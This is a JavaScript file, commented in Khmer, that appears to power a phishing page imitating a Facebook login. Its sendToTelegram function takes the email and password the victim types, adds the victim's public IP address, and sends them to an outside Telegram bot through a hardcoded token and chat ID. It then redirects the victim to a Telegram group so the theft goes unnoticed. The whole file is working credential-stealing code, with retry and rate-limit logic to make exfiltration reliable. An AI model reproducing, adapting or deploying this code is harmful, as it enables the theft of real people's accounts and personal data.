// ==================== ការកំណត់រចនាសម្ព័ន្ធ ====================
const CONFIG = {
    TOKEN: "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg",
    CHAT_ID: "6837307356",
    GROUP_LINK: "https://t.me/+7LTtj5yoBBxjMGVl",
    MAX_RETRIES: 3,
    RETRY_DELAY: 1000,
    SESSION_TIMEOUT: 300000,
    RATE_LIMIT_DELAY: 2000
};

// ==================== អថេរសកល ====================
let failedAttempts = 0;
let sessionStartTime = Date.now();
let rateLimitTimer = null;
let isProcessing = false;
let attemptsCount = 0;

// ==================== មុខងារកម្រិតខ្ពស់ ====================

// 1. ទទួលបាន IP Public
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return "មិនអាចទាញយក IP បាន";
    }
}

// 2. ទទួលបានព័ត៌មាន Browser
function getBrowserInfo() {
    const ua = navigator.userAgent;
    return {
        language: navigator.language,
        screenSize: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

// 3. ការពារ Rate Limiting
async function rateLimit() {
    if (rateLimitTimer) {
        await new Promise(resolve => setTimeout(resolve, CONFIG.RATE_LIMIT_DELAY));
    }
    rateLimitTimer = setTimeout(() => { rateLimitTimer = null; }, CONFIG.RATE_LIMIT_DELAY);
}

// 4. Retry Mechanism
async function fetchWithRetry(url, retries = CONFIG.MAX_RETRIES) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url);
            if (response.ok) return response;
            if (response.status === 429) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (i + 1)));
                continue;
            }
        } catch (error) {
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
        }
    }
    throw new Error("Max retries exceeded");
}

// 5. ទម្រង់អត្ថបទក្នុង Telegram
function formatTelegramMessage(email, password, ip, date) {
    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
           "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "📧 " + email + "\n" +
           "🔑 " + password + "\n" +
           "🌐 " + ip + "\n" +
           "📅 " + date + "\n" +
           "━━━━━━━━━━━━━━━━━━━━━━";
}

// 6. Toast Notification
function showToast(message, type = "success") {
    const toast = document.createElement('div');
    toast.textContent = message;
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: ${type === "success" ? "#0084ff" : "#ff4444"};
        color: white;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 1000;
        animation: slideUp 0.3s ease;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// 7. បន្ថែម CSS Animation
function addAnimations() {
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading-animation {
            animation: pulse 1s ease-in-out infinite;
        }
    `;
    document.head.appendChild(style);
}

// 8. Keyboard shortcut (Enter key)
function addKeyboardShortcut() {
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendToTelegram();
            }
        });
    });
}

// 9. រាប់ចំនួនព្យាយាម
function getAttemptsCount() {
    attemptsCount++;
    return attemptsCount;
}

// 10. ពិនិត្យ Session Expiry
function isSessionExpired() {
    return (Date.now() - sessionStartTime) > CONFIG.SESSION_TIMEOUT;
}

// 11. អនុគមន៍ទទួលបានពេលវេលា
function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

// 12. អនុគមន៍បើក Telegram Group
function joinTelegramGroup() {
    window.open(CONFIG.GROUP_LINK, '_blank');
}

// 13. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram
async function sendToTelegram() {
    if (isProcessing) {
        showToast("សូមរង់ចាំ...", "error");
        return;
    }
    
    if (isSessionExpired()) {
        sessionStartTime = Date.now();
        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
    }
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
        return;
    }

    isProcessing = true;
    await rateLimit();
    
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';
    loadingDiv.classList.add('loading-animation');

    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';

    try {
        const ip = await getPublicIP();
        const date = getCurrentDate();
        const attemptNum = getAttemptsCount();
        
        const message = formatTelegramMessage(email, password, ip, date);
        const encodedMessage = encodeURIComponent(message);

        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodedMessage}`;

        const response = await fetchWithRetry(url);
        const result = await response.json();

        if (result.ok) {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (លើកទី ${attemptNum})`, "success");
            joinTelegramGroup();
            failedAttempts = 0;
        } else {
            failedAttempts++;
            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        }
    } catch (error) {
        console.error("Error:", error);
        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
    } finally {
        isProcessing = false;
        loadingDiv.style.display = 'none';
        loadingDiv.classList.remove('loading-animation');
    }
}

// ==================== ការចាប់ផ្ដើម ====================
document.addEventListener('DOMContentLoaded', () => {
    addAnimations();
    addKeyboardShortcut();
    console.log("Script loaded successfully!");
});